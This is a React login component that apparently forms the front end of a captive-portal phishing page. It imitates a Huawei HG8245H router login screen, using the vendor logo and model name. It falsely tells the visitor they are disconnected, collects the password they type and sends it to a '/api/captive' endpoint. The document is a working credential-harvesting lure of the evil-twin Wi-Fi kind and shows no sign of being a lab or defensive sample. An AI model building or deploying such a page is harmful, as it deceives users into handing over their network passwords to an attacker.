"use client";
import { useState } from "react";

export default function Login() {
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      await fetch("/api/captive", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });

      window.location.href = "/";
    } catch (err) {
      console.error("Error:", err);
    }
  };

  return (
    <div className="outer">
      <div className="form-container">
        <div className="atas"></div>
        <div className="logo-flex">
          <img className="logo" src="/images/Huawei-Logo.png" />
          <h2>HG8245H</h2>
        </div>
        <form onSubmit={handleSubmit}>
          <label htmlFor="password">Password:</label>
          <br />
          <input
            className="input"
            type="password"
            id="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Login</button>
        </form>
        <p className="alert">
          *you are disconnected, please type your password again!
        </p>
      </div>
      <img className="peta" src="/images/peta.avif"/>
    </div>
  );
}
